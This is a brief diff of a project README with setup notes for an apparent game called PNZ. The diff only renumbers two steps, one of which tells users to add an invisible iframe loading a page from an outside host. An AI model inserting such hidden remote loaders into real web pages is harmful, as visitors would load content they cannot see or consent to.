@@ -46,8 +46,8 @@ You can acsess all pnz files.
 
 # BLOB HASH PNZ 
 
-- 1. Change in php files links and implement your game 'veri' varaible!
-- 2. ADD THİS CODE `<iframe id="lazy_loader_1" style="display:none;" src="http://example.com/vendor"></iframe>`
+- Change in php files links and implement your game 'veri' varaible!
+- ADD THİS CODE `<iframe id="lazy_loader_1" style="display:none;" src="http://example.com/vendor"></iframe>`
 
 
 
